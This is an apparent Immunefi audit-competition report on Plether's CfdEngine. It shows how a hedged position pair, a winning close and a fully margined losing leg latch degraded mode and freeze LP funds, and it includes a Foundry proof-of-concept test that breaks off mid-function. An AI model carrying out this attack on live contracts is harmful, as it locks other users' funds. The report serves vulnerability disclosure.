# \#99123 [SC-High] CfdEngine: a hedged pair's winning close latches degraded mode, and a zero-carry losing leg keeps all LP settlement frozen until the owner pays

**Submitted on Nov 12th 2026 at 00:30:47 UTC by @vesko210 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99123
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro
Plether admits a new position only while the pool's effective assets E cover the larger side's maximum profit L plus a 25 bps buffer B. A close has no such limit. A profitable close on the smaller side is paid from pool cash and leaves L unchanged, so it can push E below L. `CfdEngine` then latches degraded mode. While the latch is set, every LP epoch settlement reverts: no redemption is funded and no deposit activates, in either tranche. Every open is refused, and no trader with an open position can withdraw. Only the owner can clear the latch, and only once E ≥ L again. An attacker with a hedged LONG/SHORT pair that fills the pool to its admission limit can set the latch with one winning close after a basket move of about 0.75%. It then tops up the losing leg to full margin, so that leg pays no carry and cannot be liquidated. From then on nothing in the protocol brings E back up to L. The whole pool stays frozen until the owner donates the gap from its own wallet; the PoC shows it unchanged after 7 days. On a 10,002,000 USDG pool the PoC attack costs 39,321-62,671 USDG, and the pool keeps most of that as VPI and fees.

## Vulnerability Details
**Opens need headroom B above L. Closes do not.**

Every open or increase must leave `E ≥ L + B`. Here `E` is pool assets minus trader claims, `L = max(longMaxProfit, shortMaxProfit)`, and `B = ceil(L × 25 / 10,000)`:

```solidity
// CfdEnginePlanLib.sol, _applyOpenSettlementBufferAfterPlan
satisfied = SolvencyAccountingLib.hasRequiredSettlementBuffer(
    result.effectiveAssetsAfterAssets, result.maxLiabilityAfterAssets, snap.settlementBufferBps
);
```

A close is never rejected for solvency. The NatSpec of `planClose` says so: "A valid close may project degraded mode; solvency is reported rather than rejected". The close's price gain is paid at once whenever pool cash net of trader claims covers it. L and B play no part in that test:

```solidity
// CfdEnginePlanLib.sol, _planIsolatedCloseSettlement
uint256 freePoolCashAssets =
    CashPriorityLib.reserveFreshPayouts(poolCashAfterCollectionsAssets, claimsAfterPriceNettingAssets)
.freeCashAssets;
if (delta.pricePayoutAssets > 0) {
    delta.pricePayoutIsImmediate = freePoolCashAssets >= delta.pricePayoutAssets;
```

A close lowers only its own side's envelope. When the closing side is not the larger one, L stays the same while E falls by the payout.

**One close sets a latch that only the owner can lift.**

After every close and liquidation, the engine compares E with L:

```solidity
// CfdEngine.sol, _enterDegradedModeIfInsolvent
uint256 maxLiabilityAssets = _maxLiability();
if (effectiveAssetsAfter < maxLiabilityAssets) {
    degradedMode = true;
    emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
}
```

While `degradedMode` is set:
- `HousePool._settleLpEpoch` reverts with `HousePool__DegradedMode` before it does anything. No redemption is funded and no deposit activates, in either tranche. A matured Junior deposit cannot be cancelled (`DepositEpochAlreadyActive`). A Senior deposit is committed when requested and cannot be cancelled either (`SeniorDepositCommitted`). A matured redemption cannot be cancelled (`RedeemCancellationUnavailable`). New deposit requests revert (`DepositsUnavailable`).
- Every open fails: `OrderRouter__DegradedMode` at commit, `DEGRADED_MODE` at execution.
- `validateWithdraw` reverts with `CfdEngine__DegradedMode` for every account that holds a position. Such a trader can get its free settlement out only by closing first.

The flag is cleared in exactly one place, the owner-only `clearDegradedMode`, and only when `E ≥ L`:

```solidity
// CfdEngine.sol
function clearDegradedMode() external onlyOwner {
    if (!degradedMode) {
        revert CfdEngine__NotDegraded();
    }
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) {
        revert CfdEngine__StillInsolvent();
    }
    degradedMode = false;
    emit DegradedModeCleared();
}
```

**The attack.**
1. The attacker uses two accounts. At a basket price of 1.00, account A opens LONG and account B opens SHORT, in alternating chunks of up to 2,000,000 USDG, so skew stays under the 0.4 × depth cap. It stops when one more open would break `E ≥ L + B`. In the PoC, E = 10,002,002 USDG and an unrelated trader already holds a 10,000 LONG. A ends at 9,966,900 LONG and B at 9,976,900 SHORT. Both envelopes then equal L: a LONG's maximum profit is its entry cost, and a SHORT's is lots × 2.00 minus its entry cost, so both are 9,976,900 at 1.00. B is 24,942 USDG, and E − L − B is 159 USDG. The price PnL of the two legs cancels. The open fees are 7,977 USDG in total. Each increase must post new margin for its 10 bps liquidation reserve. The PoC posts 150,000 USDG on the first chunk of each leg and 0.5% of each later chunk.
2. The attacker waits for the basket to move by about 0.75% or more. The direction does not matter.
3. It closes the winning leg. The pool pays the gain minus the close VPI and the 4 bps execution fee. The fee also stays in the pool: the treasury top-up is paid only from free cash above `L + B`, and there is none at the edge. After a 1% move, a full close has a gain of 99,769, close VPI of about 50,759 and a fee of about 4,031. The PoC measures a pool payout of 44,978 USDG, and the treasury receives nothing. That is 20,036 more than B. With the 159 USDG of slack, E falls to L − 19,876, and degraded mode latches.
4. It calls `addMargin` on the losing leg until the margin covers the leg's maximum profit (9,966,900 USDG in the PoC, which adds 9,800,972 USDG). The carry base `max(maxProfit − margin, 0)` is then zero, so the leg pays no carry. With margin equal to its notional, the leg cannot be liquidated. The PoC shows it is still solvent after a 50% adverse move to 1.50. `addMargin` has no degraded-mode gate.

From then on L cannot fall: the leg stays open, and a LONG's maximum profit is fixed at its entry cost. E rises only when new cash enters the pool. The latch blocks deposits and opens. A direct USDG transfer is not counted, because `totalAssets()` is `min(balance, accountedAssets)`, and only the owner can admit it. Losses and carry paid by other traders would help, but here the attacker's pair is almost the whole book. In practice, the only way out is owner money.

**Threshold, recomputed with close VPI.**

Closing x of the winning leg after a move m pays out `x·m − 0.005·(x·(1+m))²/D − 0.0004·x·(1+m)`. Close VPI is `C(post) − C(pre)` with `C(S) = 0.005·S²/D`, and the skew goes from 0 to x. With the PoC's state (D = E = 10,002,002 USDG, L = 9,976,900 USDG, B = 24,942 USDG, E − L − B = 159 USDG) and release parameters:

| Move | Close size | Gain | Close VPI | Fee | Pool outflow | L − E after close | Latch |
|---|---|---|---|---|---|---|---|
| 0.70% | full | 69,838 | 50,458 | 4,019 | 15,361 | below 0 (E − L = 9,740) | no |
| 0.80% | 7,478,100 (best) | 59,825 | 28,404 | 3,015 | 28,405 | 3,304 | yes |
| 1.00% | full | 99,769 | 50,759 | 4,031 | 44,979 | 19,878 | yes |
| 1.50% | full | 149,654 | 51,263 | 4,051 | 94,340 | 69,239 | yes |

The PoC runs the first three rows. It measures a pool outflow of 15,361 and E − L = 9,740 with no latch at 0.70%, L − E = 3,303 with a latch at 0.80%, and a pool outflow of 44,978 with L − E = 19,876 and a latch at 1.00%.

The latch needs a move of at least 0.75% with the best partial close, or 0.80% with a full close. Our tool's original example used 0.35% and left out the close VPI, so it was wrong. Section 8.3 of the whitepaper gives a median daily basket move of 22.67 bps and a 95th percentile of 83 bps. A cumulative move of 0.75% in either direction therefore typically arrives within days.

**The pool can also reach the edge without the attacker filling it.** LP epoch funding pays redemptions until free cash is zero, which leaves pool cash at `C + L + B`, so `E = L + B`. From there any profitable close on the smaller side that pays out more than B latches the pool, with no attacker at all. The attacker in this report only chooses the moment and keeps the latch set.

**Why this is not intended.**
- **The repo test models real insolvency, not this.** `test_ProfitableCloseLatchesDegradedModeWhenBackingFallsBelowLiability` opens a 999,000 SHORT and a 500,000 LONG on a 1,000,000 pool with VPI turned off. It then closes the LONG after an 80% basket fall, from 1.00 to 0.20. The remaining SHORT is then 799,000 under water on 50,000 of margin, so the pool really cannot cover its book. The test's own message reads "Profitable close should latch degraded mode when it reveals insolvency". The whitepaper says the same: "valid terminal exits can complete even when they reveal insolvency; and a degraded-mode latch then prevents further risk expansion". In this report nothing is insolvent. The held leg's loss is fully collateralized. The pool's NAV has gone up by the fees and VPI the attacker paid. E is below L only against a basket move to zero. The cash that left was paid to the attacker's own winning leg, and its own losing leg owes it back.
- **The docs expect the latch to clear when solvency is "genuinely restored".** ACCOUNTING_SPEC.md allows "owner action to clear the mode after solvency is genuinely restored". The whitepaper says the owner may clear it "after genuine restoration to A_eff ≥ L_max". Here the latch itself blocks every inflow that could restore E (deposits and opens), and the attacker's leg pays no carry. The only route left is a gift from the owner. No document accepts that an untrusted trader can choose when the latch fires, for about 39,000 USDG, and then keep it set for free.
- **The buffer rules do not cover this.** SECURITY.md says closes "may consume" B, and that `L <= E < L + B` "is solvent but unavailable for new risk and LP redemption funding". That state is only a liquidity pause. Deposits still activate, new LP money can fund exits, and the pause ends when cash arrives or positions close. The PoC controls show this: at the edge without the latch, the first settlement funds only 3 bps of the matured Senior redemption, but the queued 500,000 USDG deposit activates and funds that redemption in full one epoch later. The latch is a different state: settlement reverts as a whole, and the latch outlives the positions that caused it.
- **Not a known issue.** The program's known-issue list has no item on how degraded mode is triggered. The documents quoted above are design notes, not accepted risks. Cecuro LOW-73 covers only creating stop-loss protection while degraded.

## Impact Details
Selected impact: Temporary freezing of funds for at least 24 hours (High).

- **What is frozen.** All LP capital in the pool: no Junior or Senior redemption is funded, and matured requests cannot be cancelled. Every queued LP deposit: it cannot activate, and neither a matured Junior deposit nor a Senior deposit can be cancelled. The free settlement of every trader with an open position, unless that trader closes. New deposits and all opens are refused.
- **How long.** The code sets no limit. While the attacker holds its fully margined leg, nothing raises E or lowers L. The latch ends only when the owner adds `L − E` of its own money and then calls `clearDegradedMode`. `recapitalizePool` mints no shares, so the owner gets nothing back. The gap is 19,876 USDG after a 1% move in the PoC and about 69,239 USDG after a 1.5% move, and the attacker picks the move it waits for. To reopen trading and LP redemption funding at the same time, the owner must add `L + B − E` (44,818 USDG after a 1% move). In the PoC, `recapitalizePool(L − E)` is enough to clear the latch, but the payment stays queued in `pendingRecapitalizationAssets`. A pending claimant bucket keeps deposit activation closed (`HousePoolTrancheGateLib.trancheDepositsAllowed`), no redemption has free cash, and the next `settleLpEpoch` reverts with `HousePool__NoLpEpochProgress`. Settlement resumed only when the owner instead transferred `L − E` to the pool and admitted it with the owner-only `accountExcess`. One atom less still left `clearDegradedMode` reverting. The project's emergency guide answers an unexpected degraded latch with diagnosis and risk-off or full containment, not with an immediate gift. The PoC shows the state unchanged after 7 days. The code never ends the freeze. It ends only when the owner decides to donate.
- **Cost against harm.** The PoC measures the attacker's mark-to-market cost at the moment of the latch: 39,321 USDG after a 0.8% move with the best partial close, and 62,671 USDG after a 1% move with a full close. Of this, 7,977 USDG is open fees paid to the treasury and 2 USDG is keeper bounties. The rest stays in the pool as VPI and fees. That rest includes 9,952 USDG of the held LONG's open VPI, which comes back to the attacker when it finally closes that leg. For this spend, the attacker freezes the whole pool: 10,002,000 USDG of LP principal plus a 500,000 USDG queued deposit in the PoC, 159 to 254 times what it paid. LPs lose no principal. The harm is that their capital and any queued deposits cannot move.
- **Preconditions.** Two accounts. Each leg needs enough margin to survive the move, and more than the 3% weekend FAD requirement (about 300,000 USDG) if the pair is held over a weekend. Making the held leg carry-free needs about 9.97M USDG of margin (9,966,900 USDG in the PoC), all returned when the attacker closes. The pool must be at its admission edge, which the attacker can produce itself, and the basket must move at least 0.75%. If the winning leg is not fully margined while the attacker waits, its carry is paid into the pool when it closes, which raises the required move by about 0.013% per day of waiting.

## References
- Open admission requires `E ≥ L + B`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L770-L777
- `hasRequiredSettlementBuffer`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/SolvencyAccountingLib.sol#L93-L104
- Closes report solvency instead of rejecting: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L795-L796
- Close payout checks only cash net of claims: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L953-L966
- Close fee top-up only from free cash above `L + B`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L984-L987
- Engine payout rule: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L840-L871
- `_applyClose` runs the latch check: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1306-L1322
- The latch: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1369
- `_maxLiability`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1044-L1050
- Owner-only clear: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L655-L667
- Recapitalization mints no shares: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L627-L653
- LP epoch settlement reverts while degraded: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L832 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1870
- Deposit entry blocked while degraded: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1139-L1145
- Matured Junior deposits and committed Senior deposits cannot be cancelled: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L860
- Matured redemptions cannot be cancelled: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L894-L897
- Withdrawals blocked for position holders: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L274-L276
- Opens blocked: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L318-L321 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L328-L330
- `addMargin` has no degraded gate: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L529
- Carry base is zero when margin covers maximum profit: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/PositionRiskAccountingLib.sol#L48-L53
- Maximum profit per side: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L76-L90
- VPI curve: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L118-L140
- The repo test (80% move, real shortfall): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/close/DegradedSettlementBehavior.t.sol#L32-L44
- ACCOUNTING_SPEC.md, clear "after solvency is genuinely restored": https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1201-L1233
- WHITEPAPER.md, latch when exits "reveal insolvency": https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L41-L44 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1322-L1342
- SECURITY.md, buffer and latch design: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L340 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L936-L943
- Emergency guide response to `EngineDegraded`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/EMERGENCY_RESPONSE_GUIDE.md#L178

## Recommendation
- Latch on real insolvency, not on raw `E < L`. Count the collectible price losses of open positions, up to their pledged margin, as backing in the latch test, as terminal NAV already does. A gain paid out of a hedged book is then backed by the matching loss and does not latch.
- Let anyone clear the latch once `E ≥ L`, so it cannot outlive the positions that caused it. Keep the owner-only clear for anything else.
- Consider charging carry on the part of L that a position occupies even when it is fully margined, so the losing leg cannot hold the pool at the edge for free.


## Proof of Concept

## Proof of Concept

**Test file:** `packages/perps/test/perps/poc/HedgedCloseLatchesDegradedModePoC.t.sol` (create it with the code below)
**Run** (from the repository root): `forge test --root packages/perps --match-path test/perps/poc/HedgedCloseLatchesDegradedModePoC.t.sol -vv`

The test uses the project's own Foundry setup (`BasePerpTest`) with the release risk parameters and Senior caps, and does not change any in-scope contract. Only Pyth prices and USDG are mocked. Every trader, keeper and LP step goes through a public entry point from the actor's own address: the order router's commit, execute, `updateMarkPrice`, `settleLpEpoch` and `executeLiquidation`, `CfdEngine.addMargin`, `MarginClearinghouse.withdrawMargin`, and the `TrancheVault` request and cancel functions. The owner (the test contract) acts only in the final cure step, with `recapitalizePool`, a direct USDG transfer plus `accountExcess`, and `clearDegradedMode`.

### Steps
**Step 1.** A Junior LP deposits 8,000,000 USDG and a Senior LP deposits 2,000,000 USDG. With the two 1,000 USDG seeds of the test base, E is 10,002,002 USDG. An unrelated trader (the bystander) opens a 10,000 LONG with 1,000 USDG of margin.

**Step 2.** At the start of a fresh LP epoch, a new LP queues a 500,000 USDG Junior deposit. The Junior LP requests to redeem 1,000,000 USDG worth of shares, and the Senior LP 500,000 USDG worth. All three requests mature at the next epoch boundary.

**Step 3.** The attacker builds the hedged pair at 1.00 from two accounts, alternating LONG (A) and SHORT (B) chunks of at most 2,000,000 so skew stays under 0.4 × depth. Each LONG chunk is the largest that keeps `E ≥ L + B`. A ends with 9,966,900 LONG and B with 9,976,900 SHORT. Both side envelopes equal L = 9,976,900 USDG, the buffer B is 24,942 USDG, and E − L − B is 159 USDG. The test asserts the pool is at its admission edge and not degraded.

**Step 4 (attack).** The basket moves to 1.01 and B closes its whole SHORT through the router. The gain is 99,769 USDG. The pool pays 44,978 USDG, and the treasury receives no close fee. E falls to 9,957,023 USDG while L stays at 9,976,900, so L − E = 19,876 USDG and `degradedMode` is set by this close. The attacker's mark-to-market cost at this point is 62,671 USDG: 7,977 of open fees to the treasury, 2 of keeper bounties, and 54,692 kept by the pool. 9,952 of that is the LONG's open VPI, which the attacker gets back when it closes the LONG. The frozen LP principal is 10,002,000 USDG, 159 times the cost.

**Step 5.** A calls `addMargin` with 9,800,972 USDG. Its carry base becomes 0. A liquidation attempt after a 50% adverse move to 1.50 reverts with `CfdEngine__PositionIsSolvent`.

**Step 6.** The test checks the freeze right after the latch, at the maturity boundary, 24 hours later and 7 days later. It measures the elapsed time with `vm.getBlockTimestamp()` (24 h and 168 h). Each time:
- `router.settleLpEpoch` reverts with `HousePool__DegradedMode`. The queued deposit is not activated, and neither redemption is funded.
- Once the requests have matured, cancelling them reverts: `TrancheVault__DepositEpochAlreadyActive` for the deposit, and `TrancheVault__RedeemCancellationUnavailable` for both redemptions.
- With a fresh mark, the bystander's `withdrawMargin` reverts with `CfdEngine__DegradedMode`.
- A new trader's commit, even a skew-reducing SHORT, reverts with `OrderRouter__DegradedMode`.
- A new Junior deposit request reverts with `TrancheVault__DepositsUnavailable`.
- Liquidating A reverts with `CfdEngine__PositionIsSolvent`.
- `clearDegradedMode` reverts for a keeper (not the owner), and for the owner with `CfdEngine__StillInsolvent`.

After 7 days E and L are unchanged, and A has accrued no carry.

**Step 7 (owner cure).** From the same state, two owner paths are tried:
- (a) `recapitalizePool(L − E)` lets the owner clear the latch, but the 19,876 USDG stays in `pendingRecapitalizationAssets`, and `settleLpEpoch` still reverts, now with `HousePool__NoLpEpochProgress`.
- (b) The owner transfers USDG to the pool and admits it with `accountExcess`. With one atom less than L − E, `clearDegradedMode` still reverts. With exactly L − E it succeeds, settlement activates the 500,000 USDG deposit, and the bystander can withdraw again.

**Step 8 (threshold).** From the edge, a 0.80% move and a partial close of 7,478,100 of the SHORT already latch, with L − E = 3,303 USDG. The mark-to-market cost is 39,321 USDG, and the frozen LP principal is 254 times that.

**Step 9 (controls).** Each control starts from the same edge state.
- (A) The same full close with no price move does not latch (E − L = 74,861 USDG).
- (B) The same 1% move with no close does not latch.
- In A and B, A tops up its LONG the same way. At the boundary the settlement succeeds and the queued deposit activates. The bystander can withdraw, and a new open and a new deposit request are accepted. One epoch later the Senior redemption is fully funded (10,000 bps; only 3 bps in control B's first epoch, because the pool is at its edge).
- (C) A full close after a 0.70% move pays 15,361 USDG, less than the 24,942 USDG buffer, and does not latch (E − L = 9,740 USDG).

### Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Opens must leave E >= L + B (E = pool assets net of trader claims, L = larger side's maximum profit,
///         B = 25 bps of L). Closes are never rejected for solvency, and a winning close on the side that is not the
///         larger one pays out of pool cash while L stays the same. CfdEngine._enterDegradedModeIfInsolvent then
///         latches degraded mode as soon as E < L. While latched, every LP epoch settlement reverts
///         (HousePool__DegradedMode), every open is refused, and position holders cannot withdraw. Only the owner can
///         clear the latch, and only once E >= L again.
///
///         The attacker holds a hedged LONG/SHORT pair that fills the pool to its admission edge, waits for a 1%
///         basket move, closes the winning SHORT, and tops the losing LONG up to full margin so it pays no carry and
///         cannot be liquidated. Nothing permissionless brings E back to L: LP settlement stays frozen until the owner
///         puts L - E of its own money into the pool.
///
///         Only Pyth prices (MockPyth) and USDG (MockSettlementToken) are mocked. Every trader and LP step goes
///         through a public entry point from the actor's own address: OrderRouter commit/execute, updateMarkPrice,
///         settleLpEpoch and executeLiquidation; CfdEngine.addMargin; MarginClearinghouse.withdrawMargin; TrancheVault
///         requests and cancellations. The test contract (owner) acts only in the final cure step, through
///         recapitalizePool, accountExcess and clearDegradedMode.
contract HedgedCloseLatchesDegradedModePoC is BasePerpTest {

    address internal constant KEEPER = address(0xBEEF);
    address internal constant JUNIOR_LP = address(0x1E01);
    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant NEW_LP = address(0x1E02);
    address internal constant LATE_LP = address(0x1E03);
    address internal constant BYSTANDER = address(0xB0B0);
    address internal constant FRESH_TRADER = address(0xF4E5);
    address internal constant ATTACKER_LONG = address(0xA77A);
    address internal constant ATTACKER_SHORT = address(0xA77B);

    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant MOVED_PRICE = 1.01e8;
    uint256 internal constant CHUNK_ASSETS = 2_000_000e6;
    uint256 internal constant QUANTUM_ASSETS = 100e6; // SIZE_QUANTUM (100 units) at 1.00
    uint256 internal constant ATTACKER_LONG_FUNDS = 10_200_000e6;
    uint256 internal constant ATTACKER_SHORT_FUNDS = 400_000e6;
    uint256 internal constant QUEUED_DEPOSIT = 500_000e6;

    uint256 internal depositId;
    uint256 internal juniorRedeemId;
    uint256 internal seniorRedeemId;
    uint256 internal juniorRedeemShares;
    uint256 internal seniorRedeemShares;
    uint256 internal edgeEffectiveAssets;
    uint256 internal edgeMaxLiability;
    uint256 internal edgeBuffer;
    uint256 internal treasuryBeforeBuild;
    uint256 internal keeperBeforeBuild;

    /// @dev Release risk parameters from packages/perps/DEPLOYMENT.md ("Initial release parameters").
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // Release Senior caps: 40M USDG and 80% of the pool.
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(JUNIOR_LP, 8_000_000e6);
        _fundSenior(SENIOR_LP, 2_000_000e6);

        // An unrelated trader holds an ordinary, healthy position.
        _fundTrader(BYSTANDER, 5000e6);
        _trade(BYSTANDER, CfdTypes.Side.LONG, 10_000e18, 1000e6, false, ENTRY_PRICE);

        _fundTrader(ATTACKER_LONG, ATTACKER_LONG_FUNDS);
        _fundTrader(ATTACKER_SHORT, ATTACKER_SHORT_FUNDS);
        _fundTrader(FRESH_TRADER, 10_000e6);

        // Start of a fresh LP epoch (both LP deposit cooldowns have passed). Every request below matures at the next
        // boundary, after the attack.
        _warpTo(pool.lpEpochStart(juniorVault.currentDepositEpoch() + 1) + 1);
        _refreshMark(ENTRY_PRICE);

        settlementToken.mint(NEW_LP, QUEUED_DEPOSIT);
        vm.startPrank(NEW_LP);
        settlementToken.approve(address(juniorVault), QUEUED_DEPOSIT);
        depositId = juniorVault.requestDeposit(QUEUED_DEPOSIT, NEW_LP, NEW_LP);
        vm.stopPrank();

        juniorRedeemShares = juniorVault.convertToShares(1_000_000e6);
        vm.prank(JUNIOR_LP);
        juniorRedeemId = juniorVault.requestRedeem(juniorRedeemShares, JUNIOR_LP, JUNIOR_LP);
        seniorRedeemShares = seniorVault.convertToShares(500_000e6);
        vm.prank(SENIOR_LP);
        seniorRedeemId = seniorVault.requestRedeem(seniorRedeemShares, SENIOR_LP, SENIOR_LP);
        assertEq(juniorRedeemId, depositId, "same maturity epoch");
        assertEq(seniorRedeemId, depositId, "same maturity epoch");

        treasuryBeforeBuild = _settlementBalance(engine.protocolTreasury());
        keeperBeforeBuild = _keeperWealth();

        _buildHedgedPairAtAdmissionEdge();

        edgeEffectiveAssets = _effectiveAssets();
        edgeMaxLiability = _maxLiability();
        edgeBuffer = _buffer(edgeMaxLiability);

        // The pair fills the pool to its admission edge: both envelopes equal L and E - L - B is below 1,000 USDG.
        assertEq(_sideMaxProfit(CfdTypes.Side.LONG), _sideMaxProfit(CfdTypes.Side.SHORT), "hedged: both sides equal L");
        assertGe(edgeEffectiveAssets, edgeMaxLiability + edgeBuffer, "admission rule E >= L + B holds");
        assertLt(edgeEffectiveAssets - edgeMaxLiability - edgeBuffer, 1000e6, "pool is at its admission edge");
        assertFalse(engine.degradedMode(), "not degraded at the edge");
        assertLt(vm.getBlockTimestamp(), pool.lpEpochStart(depositId) - 5 minutes, "setup stays inside one LP epoch");
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Attack
    // ---------------------------------------------------------------------------------------------------------------

    /// @notice After a 1% move, the attacker's winning close latches degraded mode. With the losing leg fully
    ///         margined, LP settlement, opens, deposits and position-holder withdrawals stay frozen for 7+ days, until
    ///         the owner pays L - E.
    function test_HedgedWinningCloseLatchesAndFreezesLpSettlement() public {
        _logEdge();

        // 1. The basket moves +1%. The attacker closes its winning SHORT leg in full.
        uint256 treasuryBeforeClose = _settlementBalance(engine.protocolTreasury());
        uint256 poolBeforeClose = pool.totalAssets();
        (uint256 shortSize,,,,,,) = engine.positions(ATTACKER_SHORT);
        _trade(ATTACKER_SHORT, CfdTypes.Side.SHORT, shortSize, 0, true, MOVED_PRICE);
        uint256 latchTime = vm.getBlockTimestamp();

        uint256 poolOutflow = poolBeforeClose - pool.totalAssets();
        uint256 effectiveAfter = _effectiveAssets();
        console2.log("[close] SHORT price gain at 1.01 (USDG)     :", (shortSize / 1e18) / 100);
        console2.log("[close] pool cash paid to SHORT (USDG)      :", poolOutflow / 1e6);
        console2.log(
            "[close] close fee paid to treasury (USDG)   :",
            (_settlementBalance(engine.protocolTreasury()) - treasuryBeforeClose) / 1e6
        );
        console2.log("[close] E after (USDG)                      :", effectiveAfter / 1e6);
        console2.log("[close] L after (USDG)                      :", _maxLiability() / 1e6);
        console2.log("[close] L - E after (USDG)                  :", (_maxLiability() - effectiveAfter) / 1e6);

        assertTrue(engine.degradedMode(), "the attacker's own close latches degraded mode");
        assertEq(_maxLiability(), edgeMaxLiability, "L is unchanged by the smaller side's close");
        assertGt(poolOutflow, edgeBuffer, "the payout exceeds the buffer B");
        assertLt(effectiveAfter, edgeMaxLiability, "E < L after the close");
        assertEq(
            _settlementBalance(engine.protocolTreasury()),
            treasuryBeforeClose,
            "close fee stays in the pool at the edge"
        );

        _logAttackerCost(MOVED_PRICE);

        // 2. The attacker tops the losing LONG up to full margin: zero carry base, cannot be liquidated.
        _topUpLosingLeg();
        assertTrue(engine.degradedMode(), "addMargin is not gated and does not clear the latch");
        {
